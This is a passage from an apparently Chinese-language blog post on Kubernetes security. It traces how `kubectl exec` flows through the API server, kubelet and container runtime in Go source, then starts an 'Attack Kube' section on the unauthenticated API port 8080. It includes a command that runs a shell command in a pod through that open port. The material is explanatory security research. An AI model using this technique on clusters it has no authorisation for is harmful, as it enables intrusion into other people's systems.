kubectl -s http://ip:8080 exec &lt;pod&gt; -n &lt;namespace&gt; -c &lt;container&gt; -- ls</code></pre><p>HTTP响应包看不到命令执行结果，需要在TCP流中才能看到</p>
<p><img src="/2021/08/15/Kubernetes-Security/image-20211026000820006-16473541254926.png" alt="image-20211026000820006"></p>
<p>浏览器或curl等直接POST请求是无法正常访问得到结果，因为涉及到协议切换升级，网上找到一篇相关帖子：<a href="https://stackoverflow.com/questions/49250370/kubernetes-pod-exec-api-upgrade-request-required" target="_blank" rel="noopener">kubernetes-pod-exec-api-upgrade-request-required</a> </p>
<p><img src="/2021/08/15/Kubernetes-Security/image-20220307184007860-16473541254927.png" alt="image-20220307184007860"></p>
<p>针对 <code>/api/v1/namespaces/&lt;namespace&gt;/pods/&lt;pod&gt;/exec?command=ls&amp;container=&lt;container&gt;&amp;stderr=true&amp;stdout=true</code> 接口的 POST 协议升级请求， <code>API Server</code> 返回了 <code>101 Switching Protocols, Upgrade</code> 响应，向客户端表示已切换到 SPDY 协议</p>
<ul>
<li>SPDY 协议是 google 开发的 TCP 会话层协议, SPDY 协议中将 Http 的 Request/Response 称为 Stream，并支持 TCP 的链接复用，同时多个 stream 之间通过 Stream-id 来进行标记，简单来说就是支持在单个链接同时进行多个请求响应的处理，并且互不影响，k8s 中的命令执行主要也就是通过 stream 来进行消息传递的</li>
</ul>
<p>API Server 收到请求后，找到需要转发的 work node 地址，即 <code>https://nodeip:10255</code> 端点地址：<code>/pkg/kubelet/client/kubelet_client.go</code></p>
<pre class="line-numbers language-go"><code class="language-go"><span class="token comment" spellcheck="true">// ConnectionInfoGetter provides ConnectionInfo for the kubelet running on a named node</span>
<span class="token keyword">type</span> ConnectionInfoGetter <span class="token keyword">interface</span> <span class="token punctuation">{</span>
    <span class="token function">GetConnectionInfo</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> nodeName types<span class="token punctuation">.</span>NodeName<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>ConnectionInfo<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// GetConnectionInfo retrieves connection info from the status of a Node API object.</span>
<span class="token keyword">func</span> <span class="token punctuation">(</span>k <span class="token operator">*</span>NodeConnectionInfoGetter<span class="token punctuation">)</span> <span class="token function">GetConnectionInfo</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> nodeName types<span class="token punctuation">.</span>NodeName<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>ConnectionInfo<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        node<span class="token punctuation">,</span> err <span class="token operator">:=</span> k<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> <span class="token function">string</span><span class="token punctuation">(</span>nodeName<span class="token punctuation">)</span><span class="token punctuation">,</span> metav1<span class="token punctuation">.</span>GetOptions<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> err
        <span class="token punctuation">}</span>

        <span class="token comment" spellcheck="true">// Find a kubelet-reported address, using preferred address type</span>
        host<span class="token punctuation">,</span> err <span class="token operator">:=</span> nodeutil<span class="token punctuation">.</span><span class="token function">GetPreferredNodeAddress</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> k<span class="token punctuation">.</span>preferredAddressTypes<span class="token punctuation">)</span>
        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> err
        <span class="token punctuation">}</span>

        <span class="token comment" spellcheck="true">// Use the kubelet-reported port, if present</span>
        port <span class="token operator">:=</span> <span class="token function">int</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>Status<span class="token punctuation">.</span>DaemonEndpoints<span class="token punctuation">.</span>KubeletEndpoint<span class="token punctuation">.</span>Port<span class="token punctuation">)</span>
        <span class="token keyword">if</span> port <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">{</span>
                port <span class="token operator">=</span> k<span class="token punctuation">.</span>defaultPort
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token operator">&amp;</span>ConnectionInfo<span class="token punctuation">{</span>
                Scheme<span class="token punctuation">:</span>    k<span class="token punctuation">.</span>scheme<span class="token punctuation">,</span>
                Hostname<span class="token punctuation">:</span>  host<span class="token punctuation">,</span>
                Port<span class="token punctuation">:</span>      strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">,</span>
                Transport<span class="token punctuation">:</span> k<span class="token punctuation">.</span>transport<span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>从 apiserver 到 kubelet 的 <a href="https://kubernetes.io/zh/docs/concepts/architecture/control-plane-node-communication/#api-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%88%B0-kubelet" target="_blank" rel="noopener">连接</a> 用于：</p>
<ul>
<li>获取 Pod 日志</li>
<li>挂接（通过 kubectl）到运行中的 Pod</li>
<li>提供 kubelet 的端口转发功能。</li>
</ul>
</blockquote>
<p>API Server 得到了端点地址后，打开连接：<code>/pkg/registry/core/pod/rest/subresources.go</code></p>
<pre class="line-numbers language-go"><code class="language-go"><span class="token comment" spellcheck="true">// Connect returns a handler for the pod portforward proxy</span>
<span class="token keyword">func</span> <span class="token punctuation">(</span>r <span class="token operator">*</span>PortForwardREST<span class="token punctuation">)</span> <span class="token function">Connect</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> name <span class="token builtin">string</span><span class="token punctuation">,</span> opts runtime<span class="token punctuation">.</span>Object<span class="token punctuation">,</span> responder rest<span class="token punctuation">.</span>Responder<span class="token punctuation">)</span> <span class="token punctuation">(</span>http<span class="token punctuation">.</span>Handler<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    portForwardOpts<span class="token punctuation">,</span> ok <span class="token operator">:=</span> opts<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>api<span class="token punctuation">.</span>PodPortForwardOptions<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token operator">!</span>ok <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"invalid options object: %#v"</span><span class="token punctuation">,</span> opts<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    location<span class="token punctuation">,</span> transport<span class="token punctuation">,</span> err <span class="token operator">:=</span> pod<span class="token punctuation">.</span><span class="token function">PortForwardLocation</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> r<span class="token punctuation">.</span>Store<span class="token punctuation">,</span> r<span class="token punctuation">.</span>KubeletConn<span class="token punctuation">,</span> name<span class="token punctuation">,</span> portForwardOpts<span class="token punctuation">)</span>
    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> err
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token function">newThrottledUpgradeAwareProxyHandler</span><span class="token punctuation">(</span>location<span class="token punctuation">,</span> transport<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> responder<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Kubelet 提供了一个服务端口，用来响应 API Server 的请求: <code>/pkg/kubelet/cri/streaming/server.go</code></p>
<pre class="line-numbers language-go"><code class="language-go"><span class="token comment" spellcheck="true">// Server is the library interface to serve the stream requests.</span>
<span class="token keyword">type</span> Server <span class="token keyword">interface</span> <span class="token punctuation">{</span>
        http<span class="token punctuation">.</span>Handler

        <span class="token comment" spellcheck="true">// Get the serving URL for the requests.</span>
        <span class="token comment" spellcheck="true">// Requests must not be nil. Responses may be nil iff an error is returned.</span>
        <span class="token function">GetExec</span><span class="token punctuation">(</span><span class="token operator">*</span>runtimeapi<span class="token punctuation">.</span>ExecRequest<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>runtimeapi<span class="token punctuation">.</span>ExecResponse<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span>
        <span class="token function">GetAttach</span><span class="token punctuation">(</span>req <span class="token operator">*</span>runtimeapi<span class="token punctuation">.</span>AttachRequest<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>runtimeapi<span class="token punctuation">.</span>AttachResponse<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span>
        <span class="token function">GetPortForward</span><span class="token punctuation">(</span><span class="token operator">*</span>runtimeapi<span class="token punctuation">.</span>PortForwardRequest<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>runtimeapi<span class="token punctuation">.</span>PortForwardResponse<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span>

        <span class="token comment" spellcheck="true">// Start the server.</span>
        <span class="token comment" spellcheck="true">// addr is the address to serve on (address:port) stayUp indicates whether the server should</span>
        <span class="token comment" spellcheck="true">// listen until Stop() is called, or automatically stop after all expected connections are</span>
        <span class="token comment" spellcheck="true">// closed. Calling Get{Exec,Attach,PortForward} increments the expected connection count.</span>
        <span class="token comment" spellcheck="true">// Function does not return until the server is stopped.</span>
        <span class="token function">Start</span><span class="token punctuation">(</span>stayUp <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token builtin">error</span>
        <span class="token comment" spellcheck="true">// Stop the server, and terminate any open connections.</span>
        <span class="token function">Stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">error</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Kubelet 收到 API Server 的 exec 请求后，会生成一个 GetExec 响应端点: <code>/pkg/kubelet/cri/streaming/server.go</code></p>
<pre class="line-numbers language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>server<span class="token punctuation">)</span> <span class="token function">GetExec</span><span class="token punctuation">(</span>req <span class="token operator">*</span>runtimeapi<span class="token punctuation">.</span>ExecRequest<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>runtimeapi<span class="token punctuation">.</span>ExecResponse<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> err <span class="token operator">:=</span> <span class="token function">validateExecRequest</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> err
        <span class="token punctuation">}</span>
        token<span class="token punctuation">,</span> err <span class="token operator">:=</span> s<span class="token punctuation">.</span>cache<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>
        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> err
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token operator">&amp;</span>runtimeapi<span class="token punctuation">.</span>ExecResponse<span class="token punctuation">{</span>
                Url<span class="token punctuation">:</span> s<span class="token punctuation">.</span><span class="token function">buildURL</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>GetExec 返回的不是命令结果，而是一个用于通信的端点</p>
<pre class="line-numbers language-go"><code class="language-go"><span class="token keyword">type</span> ExecResponse <span class="token keyword">struct</span> <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">// Fully qualified URL of the exec streaming server.</span>
        Url                  <span class="token builtin">string</span>   <span class="token string">`protobuf:"bytes,1,opt,name=url,proto3" json:"url,omitempty"`</span>
        XXX_NoUnkeyedLiteral <span class="token keyword">struct</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token string">`json:"-"`</span>
        XXX_sizecache        <span class="token builtin">int32</span>    <span class="token string">`json:"-"`</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Kubelet 实现了一个 CRI 规范中的 <code>RuntimeServiceClient</code> 接口，使用 gRPC 通过 CRI 调用方法</p>
<pre class="line-numbers language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>c <span class="token operator">*</span>runtimeServiceClient<span class="token punctuation">)</span> <span class="token function">Exec</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> in <span class="token operator">*</span>ExecRequest<span class="token punctuation">,</span> opts <span class="token operator">...</span>grpc<span class="token punctuation">.</span>CallOption<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>ExecResponse<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        out <span class="token operator">:=</span> <span class="token function">new</span><span class="token punctuation">(</span>ExecResponse<span class="token punctuation">)</span>
        err <span class="token operator">:=</span> c<span class="token punctuation">.</span>cc<span class="token punctuation">.</span><span class="token function">Invoke</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> <span class="token string">"/runtime.v1alpha2.RuntimeService/Exec"</span><span class="token punctuation">,</span> in<span class="token punctuation">,</span> out<span class="token punctuation">,</span> opts<span class="token operator">...</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> err
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> out<span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最后，容器运行时在工作节点上执行命令</p>
<pre class="line-numbers language-go"><code class="language-go"><span class="token comment" spellcheck="true">// ExecContainer prepares a streaming endpoint to execute a command in the container.</span>
<span class="token keyword">func</span> <span class="token punctuation">(</span>r <span class="token operator">*</span>runtimeOCI<span class="token punctuation">)</span> <span class="token function">ExecContainer</span><span class="token punctuation">(</span>c <span class="token operator">*</span>Container<span class="token punctuation">,</span> cmd <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span> stdin io<span class="token punctuation">.</span>Reader<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr io<span class="token punctuation">.</span>WriteCloser<span class="token punctuation">,</span> tty <span class="token builtin">bool</span><span class="token punctuation">,</span> resize <span class="token operator">&lt;-</span><span class="token keyword">chan</span> remotecommand<span class="token punctuation">.</span>TerminalSize<span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">{</span>
        processFile<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">prepareProcessExec</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> cmd<span class="token punctuation">,</span> tty<span class="token punctuation">)</span>
        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> err
        <span class="token punctuation">}</span>
        <span class="token keyword">defer</span> os<span class="token punctuation">.</span><span class="token function">RemoveAll</span><span class="token punctuation">(</span>processFile<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        args <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span>rootFlag<span class="token punctuation">,</span> r<span class="token punctuation">.</span>root<span class="token punctuation">,</span> <span class="token string">"exec"</span><span class="token punctuation">}</span>
        args <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> <span class="token string">"--process"</span><span class="token punctuation">,</span> processFile<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span><span class="token function">ID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        execCmd <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>path<span class="token punctuation">,</span> args<span class="token operator">...</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> v<span class="token punctuation">,</span> found <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">LookupEnv</span><span class="token punctuation">(</span><span class="token string">"XDG_RUNTIME_DIR"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> found <span class="token punctuation">{</span>
                execCmd<span class="token punctuation">.</span>Env <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>execCmd<span class="token punctuation">.</span>Env<span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"XDG_RUNTIME_DIR=%s"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">var</span> cmdErr<span class="token punctuation">,</span> copyError <span class="token builtin">error</span>
        <span class="token keyword">if</span> tty <span class="token punctuation">{</span>
                cmdErr <span class="token operator">=</span> <span class="token function">ttyCmd</span><span class="token punctuation">(</span>execCmd<span class="token punctuation">,</span> stdin<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> resize<span class="token punctuation">)</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> stdin <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
                        <span class="token comment" spellcheck="true">// Use an os.Pipe here as it returns true *os.File objects.</span>
                        <span class="token comment" spellcheck="true">// This way, if you run 'kubectl exec &lt;pod> -i bash' (no tty) and type 'exit',</span>
                        <span class="token comment" spellcheck="true">// the call below to execCmd.Run() can unblock because its Stdin is the read half</span>
                        <span class="token comment" spellcheck="true">// of the pipe.</span>
                        r<span class="token punctuation">,</span> w<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Pipe</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
                                <span class="token keyword">return</span> err
                        <span class="token punctuation">}</span>
                        <span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token boolean">_</span><span class="token punctuation">,</span> copyError <span class="token operator">=</span> pools<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> stdin<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

                        execCmd<span class="token punctuation">.</span>Stdin <span class="token operator">=</span> r
                <span class="token punctuation">}</span>
                <span class="token keyword">if</span> stdout <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
                        execCmd<span class="token punctuation">.</span>Stdout <span class="token operator">=</span> stdout
                <span class="token punctuation">}</span>
                <span class="token keyword">if</span> stderr <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
                        execCmd<span class="token punctuation">.</span>Stderr <span class="token operator">=</span> stderr
                <span class="token punctuation">}</span>

                cmdErr <span class="token operator">=</span> execCmd<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> copyError <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> copyError
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> exitErr<span class="token punctuation">,</span> ok <span class="token operator">:=</span> cmdErr<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>exec<span class="token punctuation">.</span>ExitError<span class="token punctuation">)</span><span class="token punctuation">;</span> ok <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token operator">&amp;</span>utilexec<span class="token punctuation">.</span>ExitErrorWrapper<span class="token punctuation">{</span>ExitError<span class="token punctuation">:</span> exitErr<span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> cmdErr
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="Kubernetes-Security"><a href="#Kubernetes-Security" class="headerlink" title="Kubernetes Security"></a>Kubernetes Security</h1><p>2020年4月，微软发布首个 <code>Kubernetes</code> 威胁矩阵：<a href="https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/" target="_blank" rel="noopener">Threat matrix for Kubernetes</a> </p>
<p><img src="/2021/08/15/Kubernetes-Security/image-20220315174825682-16473541254928.png" alt="image-20220315174825682"></p>
<h2 id="Attack-Kube"><a href="#Attack-Kube" class="headerlink" title="Attack Kube"></a>Attack Kube</h2><p>根据<a href="https://kubernetes.io/docs/admin/accessing-the-api/#api-server-ports-and-ips" target="_blank" rel="noopener">官方文档</a>，<code>Kubernetes API Server</code> 默认会开启两个端口：<code>8080</code> 和 <code>6443</code>，其中 <code>8080</code> 端口无需认证、而<code>6443</code> 端口需要认证，且有 TLS 保护。</p>
<p>（1）Localhost Port</p>
<pre><code>- 用于测试和启动，以及管理节点的其他组件（scheduler, controller-manager）与 API 的交互
- 没有 TLS
- 默认值为 8080，可以通过 --insecure-port 标记来修改。
- 默认的 IP 地址为 localhost，可以通过 --insecure-bind-address 标记来修改。
- 请求会绕过认证和鉴权模块。
- 请求会被准入控制模块处理。
- 其访问需要主机访问的权限。</code></pre><p>（2）Secure Port</p>
<pre><code>- 尽可能使用该端口访问
- 应用 TLS。 可以通过 --tls-cert-file 设置证书， 通过 --tls-private-key-file 设置私钥。
- 默认值为 6443，可以通过 --secure-port 标记来修改。
- 默认 IP 是首个非本地的网络接口地址，可以通过 --bind-address 标记来修改。
- 请求会经过认证和鉴权模块处理。
- 请求会被准入控制模块处理。
- 要求认证和授权模块正常运行。</code></pre><h3 id="Port-8080"><a href="#Port-8080" class="headerlink" title="Port 8080"></a>Port 8080</h3><p>访问 <code>http://x.x.x.x:8080</code> 会返回 <code>Kubernetes</code> 集群可用的 <code>API</code> 列表，如：</p>
<p><img src="/2021/08/15/Kubernetes-Security/image-20210912015458770-16473541254929.png" alt="image-20210912015458770"></p>
<pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span>
  <span class="token property">"paths"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token string">"/api"</span><span class="token punctuation">,</span>
    <span class="token string">"/api/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/admissionregistration.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/admissionregistration.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/apiextensions.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/apiextensions.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/apiregistration.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/apiregistration.k8s.io/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/apiregistration.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/apps"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/apps/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/apps/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/apps/v1beta2"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/authentication.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/authentication.k8s.io/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/authentication.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/authorization.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/authorization.k8s.io/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/authorization.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/autoscaling"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/autoscaling/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/autoscaling/v2beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/autoscaling/v2beta2"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/batch"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/batch/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/batch/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/certificates.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/certificates.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/coordination.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/coordination.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/events.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/events.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/extensions"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/extensions/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/kubeflow.org"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/kubeflow.org/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/kubeflow.org/v1alpha1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/kubeflow.org/v1alpha2"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/networking.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/networking.k8s.io/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/policy"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/policy/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/rbac.authorization.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/rbac.authorization.k8s.io/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/rbac.authorization.k8s.io/v1alpha1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/rbac.authorization.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/scheduling.incubator.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/scheduling.incubator.k8s.io/v1alpha1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/scheduling.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/scheduling.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/scheduling.sigs.dev"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/scheduling.sigs.dev/v1alpha2"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/settings.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/settings.k8s.io/v1alpha1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/storage.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/storage.k8s.io/v1"</span><span class="token punctuation">,</span>
